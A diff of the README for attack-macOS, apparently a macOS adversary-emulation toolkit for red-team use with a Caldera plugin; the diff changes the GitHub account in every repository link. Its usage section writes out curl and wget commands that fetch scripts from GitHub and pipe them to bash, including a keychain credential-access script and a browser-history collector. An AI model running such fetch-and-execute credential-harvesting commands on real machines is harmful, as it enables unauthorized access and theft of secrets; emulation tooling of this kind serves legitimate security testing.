@@ -1,6 +1,6 @@
 <h1 align="center">
   <br>
-  <a href="https://github.com/armadoinc/attack-macOS"><img src="https://github.com/user-attachments/assets/03a5c7dc-9dd6-49f9-a58b-2fdcdb6596f6" alt="attack-macOS" ></a>
+  <a href="https://github.com/darmado/attack-macOS"><img src="https://github.com/user-attachments/assets/03a5c7dc-9dd6-49f9-a58b-2fdcdb6596f6" alt="attack-macOS" ></a>
   <br>
 </h1>
 
@@ -254,7 +254,7 @@ flowchart TD
 
 ```sh
 # 1. Clone the repository
-git clone https://github.com/armadoinc/attack-macOS.git
+git clone https://github.com/darmado/attack-macOS.git
 cd attack-macOS
 
 # 2. Local execution using the handler
@@ -302,7 +302,7 @@ cp -r integrations/caldera/plugins/attackmacos /path/to/caldera/plugins/
 
 ```sh
 # 1. Clone the repository
-git clone https://github.com/armadoinc/attack-macOS.git
+git clone https://github.com/darmado/attack-macOS.git
 cd attack-macOS
 
 # 2. Run a technique directly
@@ -320,19 +320,19 @@ python3 build_shell_procedure.py --input ../attackmacos/ttp/discovery/shell/syst
 
 ```sh
 # 1. Execute directly from GitHub without cloning
-curl -s https://raw.githubusercontent.com/armadoinc/attack-macOS/main/ttp/discovery/shell/system_info.sh | bash
+curl -s https://raw.githubusercontent.com/darmado/attack-macOS/main/ttp/discovery/shell/system_info.sh | bash
 
 # 2. Download and execute with parameters
-curl -s https://raw.githubusercontent.com/armadoinc/attack-macOS/main/ttp/credential_access/shell/keychain.sh | bash -s -- --verbose --log-output --encode base64
+curl -s https://raw.githubusercontent.com/darmado/attack-macOS/main/ttp/credential_access/shell/keychain.sh | bash -s -- --verbose --log-output --encode base64
 
 # 3. Execute specific technique with wget
-wget -qO- https://raw.githubusercontent.com/armadoinc/attack-macOS/main/ttp/discovery/shell/browser_history.sh | bash
+wget -qO- https://raw.githubusercontent.com/darmado/attack-macOS/main/ttp/discovery/shell/browser_history.sh | bash
 ```
 
 ## Integrations
 
 ### Caldera Plugin
-**Repository:** [https://github.com/armadoinc/caldera-plugin-attack-macos](https://github.com/armadoinc/caldera-plugin-attack-macos)
+**Repository:** [https://github.com/darmado/caldera-plugin-attack-macos](https://github.com/darmado/caldera-plugin-attack-macos)
 
 Native Caldera plugin for seamless integration with red team operations. The plugin transforms attack-macOS YAML configurations into ready-to-execute abilities using a full command approach.
 
